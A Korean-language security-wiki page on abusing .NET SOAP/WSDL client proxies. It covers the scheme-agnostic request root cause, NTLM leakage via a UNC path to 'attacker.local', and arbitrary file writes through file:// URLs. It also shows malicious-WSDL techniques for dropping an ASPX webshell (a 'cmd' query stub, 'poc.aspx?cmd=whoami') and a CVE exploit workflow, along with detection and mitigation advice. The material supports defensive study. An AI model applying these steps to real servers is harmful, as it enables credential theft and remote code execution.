# .NET SOAP/WSDL Client Proxy 악용

{{#include ../../banners/hacktricks-training.md}}

## 요약

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` 등은 `HttpWebClientProtocol`를 상속하며, 그 `GetWebRequest()`는 `WebRequest.Create()`가 생성한 스킴 비종속적인 `WebRequest` 인스턴스를 반환하고 `HttpWebRequest`를 강제하지 않습니다.
- 공격자가 프록시 `Url`을 제어하면 프레임워크는 조용히 `FileWebRequest`, `FtpWebRequest` 또는 UNC/SMB 핸들러로 교체하여 "HTTP" 프록시를 NTLM leak 장치나 임의 파일 작성기로 바꿀 수 있습니다.
- `ServiceDescriptionImporter`로 공격자가 제공한 WSDL을 가져오는 모든 기능은 문제를 악화시킵니다: WSDL은 생성된 프록시 생성자, SOAP 메서드, 복합 타입 및 네임스페이스를 제어하여 Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell, SSIS 같은 제품에서 인증 전 RCE(웹셸, 스크립트 드롭)를 가능하게 합니다.

## 원인: HttpWebClientProtocol는 스킴 비종속적임

`WebClientProtocol.GetWebRequest()`는 `var req = WebRequest.Create(uri)`를 수행하고 그것을 그대로 반환합니다. `HttpWebClientProtocol.GetWebRequest()`는 HTTP 전용 필드를 설정하기 위해 `req as HttpWebRequest`를 시도하지만, 캐스트가 실패해도 **원본 `req`를 그대로 반환**합니다. 따라서 런타임은 `Url`에 존재하는 스킴을 그대로 따릅니다:

- `http(s)://` → `HttpWebRequest`
- `file:///` 또는 `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

그 후 `SoapHttpClientProtocol.Invoke()`는 선택된 전송 핸들러를 통해 SOAP POST 본문을 스트리밍하며, 이는 디스크에 쓰거나 SMB를 통해 전송하는 것을 의미할 수 있습니다.

## 기법 1 – UNC 대상 통한 NTLM 캡처/릴레이

1. `SoapHttpClientProtocol.Url`을 제어합니다 (직접 세터, 설정값, DB 행 등).
2. 이를 `file://attacker.local/sink/payload` 같은 UNC 경로로 지정합니다.
3. CLR은 SMB로 해당 경로를 열고 통합 인증을 수행하여 NTLM challenge/response를 공격자에게 leak합니다.
4. 캡처한 해시를 오프라인 크래킹하거나 서명/EPA가 없다면 NTLM 릴레이(SMB/HTTP)에 사용합니다.

이것은 추가적 익스플로잇이 불가능하더라도 사용자 입력을 수용하는 **모든** .NET SOAP/HTTP 프록시 경로에 적용됩니다.

## 기법 2 – `file://`를 통한 임의 파일 쓰기

1. 프록시 호출 전에 `Url = "file:///inetpub/wwwroot/poc.aspx"` (또는 쓰기 가능한 경로)로 설정합니다.
2. 아무 SOAP 메서드를 호출합니다; 프레임워크는 전체 SOAP 인벌롭을 선택한 경로에 작성하여 기존 파일을 덮어씁니다.
3. 사용자 제어 인수는 XML 요소 내부에 나타나므로 공격자는 CSHTML/ASPX 페이로드를 드롭하거나 설정 파일을 오염시킬 수 있습니다.

제한사항:

- 컨텐츠는 항상 XML이며 스칼라 필드는 엔티티 인코딩됩니다. 단순 문자열로 `<script>`를 주입하려면 추가 기법이 필요합니다.
- 의미있는 페이로드는 최소한 하나의 공격자 영향 인수나 메서드 시그니처를 변경할 수 있는 능력이 필요합니다 (WSDL 악용 참조).

런타임은 쓰기 후 종종 `Client found response content type of 'application/octet-stream', but expected 'text/xml'` 예외를 던집니다 — 이 오류를 IOC로 취급하세요.

## WSDL 임포트 무기화

### `ServiceDescriptionImporter`를 통한 자동 생성 프록시

많은 제품이 WSDL URL을 허용하는 "커스텀 웹 서비스" 기능을 제공하며, 그 과정은 다음과 같습니다:

1. 공격자가 제어하는 WSDL을 `ServiceDescription.Read()`로 읽습니다.
2. `ServiceDescriptionImporter`가 `SoapHttpClientProtocol`를 확장하는 C# 프록시 클래스를 생성합니다.
3. CodeDOM이 프록시를 컴파일하고 리플렉션으로 요청된 메서드를 호출합니다.

공격자는 다음을 완전히 제어합니다:

- `soap:address` / `soap12:address` `location` → `base.Url`이 되어 `file://` 또는 UNC 경로로 설정할 수 있습니다.
- 메서드 이름, 파라미터 목록, 복합 타입 및 직렬화기.
- 모든 SOAP 메시지에 들어가는 `xmlns:*` 속성이 되는 네임스페이스 URI.

스킴 검증이 수행되지 않으므로 생성된 모든 프록시는 원래 설계 결함을 물려받습니다.

### RCE를 위한 SOAP 인벌롭 조형

- Complex type serialization: WSDL에 커스텀 구조체를 정의하여 `XmlSerializer`가 이를 재직렬화할 때 공격자가 선택한 요소 이름/속성을 생성하게 합니다. ASPX 웹셸 드롭의 경우, 다음과 같이 직렬화되도록 타입을 설계하고:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
`Url`을 `file:///.../webroot/shell.aspx`로 지정하면 RCE를 획득할 수 있습니다.
- Namespace injection: 인수가 하드코딩되어 있어도(예: Umbraco Forms) WSDL에 선언된 네임스페이스(예: `xmlns:tns="http://host/service?x=@{...}"`)는 SOAP 인벌롭에 그대로 복사됩니다. 네임스페이스 쿼리 문자열 안에 페이로드를 인코딩하면 파라미터 제어 없이도 CSHTML Razor나 PowerShell 스크립트를 드롭할 수 있습니다.

이 기법들은 Barracuda Service Center RMM(CVE-2025-34392) 익스플로잇의 핵심이었습니다: 인증 없이 SOAP 호출이 악성 WSDL을 공급했고, `soap12:address`를 `file:///Program Files/.../SCMessaging/poc.aspx`로 설정했으며, 복합 파라미터를 통해 `<script runat="server">`를 주입하여 웹셸을 업로드하고 임의의 `cmd.exe` 명령을 실행했습니다.

## 전형적인 공격 워크플로우

1. WSDL URL을 허용하거나 SOAP 엔드포인트 구성을 사용자에게 허용하는 기능(예: Barracuda `InvokeRemoteMethod`, Ivanti EPM 커넥터, Umbraco 8 Forms 데이터소스, PowerShell `New-WebServiceProxy`)을 식별합니다.
2. `soap:address`가 쓰기 가능한 경로나 UNC 공유를 가리키고 스키마 정의가 페이로드 친화적인 메서드/타입을 제공하는 악성 WSDL을 호스트합니다.
3. 임포트/컴파일을 트리거합니다. 대상은 공격자가 제어하는 생성자와 메서드를 가진 프록시 DLL을 방출합니다.
4. 애플리케이션이 생성된 메서드를 호출하면 SOAP 요청이 직렬화되어 공격자가 지정한 경로에 기록되고 페이로드가 삽입됩니다.
5. 드롭된 파일을 실행(예: `poc.aspx?cmd=whoami`로 브라우징, CSHTML 로드, 또는 PowerShell이 스크립트를 실행)하거나 캡처한 NTLM 자료를 재사용합니다.

## 탐지 및 헌팅

- Static analysis: `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, 또는 `New-WebServiceProxy`를 grep하세요. `Url` 또는 WSDL 입력이 어디서 유래하는지 추적—사용자 제어 가능하면 위험 신호입니다.
- Runtime telemetry:
- 프록시 생성 시 스킴을 로깅하도록 계측하고 `file`, `ftp`, 또는 UNC 값에 대해 경고하세요.
- SOAP 호출 후 특징적인 "Client found response content type of 'application/octet-stream'" 오류를 모니터링하세요.
- 애플리케이션 디렉터리 아래에서 웹 서비스 아이덴티티에 의해 수행된 예상치 못한 `.aspx/.cshtml/.ps1` 쓰기 동작을 감시하세요.
- Network/file 신호: 웹 서버가 공격자 인프라로 향하는 SMB 연결을 시작하거나 임시 프록시 DLL의 갑작스러운 컴파일은 종종 익스플로잇에 앞서 발생합니다.

## 완화책

- `HttpWebClientProtocol` 계열 프록시를 호출하기 전에 전송 검증을 강제하세요:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- 가져온 WSDL 검증/정제: 프록시 다운로드를 중개하여 HTTP/S가 아닌 `soap:address` 항목을 재작성하거나 거부하고, 알 수 없는 바인딩을 제거하며 네임스페이스 페이로드 기법을 금지하세요.
- 신뢰할 수 없는 WSDL 기능 비활성화: "WSDL 업로드" 편의 기능을 검증된 서버 사이드 템플릿이나 허용목록으로 대체하세요.
- 쓰기 위치 분리: 애플리케이션 풀 계정이 실행 파일 디렉터리에 쓰지 못하도록 하고, 데이터와 코드에 대해 별도 볼륨을 사용하여 파일 쓰기 프리미티브가 RCE로 이어지지 않게 하세요.
- NTLM 노출 경감: 가능한 경우 아웃바운드 SMB를 비활성화하고, 그렇지 않다면 SMB 서명, EPA 및 기타 릴레이 완화책을 적용하세요.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
